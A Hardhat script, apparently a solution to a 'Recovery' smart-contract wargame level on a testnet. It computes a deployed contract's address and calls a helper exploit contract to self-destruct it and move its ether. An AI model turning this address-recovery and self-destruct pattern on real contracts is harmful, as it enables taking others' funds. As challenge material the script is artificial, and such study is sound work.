import { ethers, network } from "hardhat"
import { RECOVERY, RECOVERYEXPLOIT } from "../constants"
import { developmentChains } from "../helper-hardhat-config"
import { Recovery, RecoveryExploit } from "../typechain-types"

const recoveryExploit = async () => {
    if (!developmentChains.includes(network.name)) {
        const deployer = (await ethers.getSigners())[0]

        const recovery = await ethers.getContractAt("Recovery", RECOVERY)
        //-n first run deployRecovery script in goerli & pase the generated contract address against RECOVERYEXPLOIT varuable defined in constants.ts
        const recoveryExploit = await ethers.getContractAt("RecoveryExploit", RECOVERYEXPLOIT)

        const balanceBefore = await ethers.provider.getBalance(RECOVERY)

        console.log("balance before (eth)", ethers.utils.formatEther(balanceBefore))
        const calculatedAddress = await recoveryExploit.getDeployedContractAddress(RECOVERY, 1)

        console.log("generated calculated address", calculatedAddress)

        // destroy simple token contract at calculated address -> and send back the eth to recovery address
        await (await recoveryExploit.destroySimpleToken(RECOVERY, 1)).wait()

        const balanceAfter = await ethers.provider.getBalance(RECOVERY)
        console.log("balance after (eth)", ethers.utils.formatEther(balanceAfter))
    }
}

recoveryExploit()
    .then(() => {
        console.log("recovery exploited successfully")
        process.exit(0)
    })
    .catch((e) => {
        console.log(e)
        process.exit(1)
    })
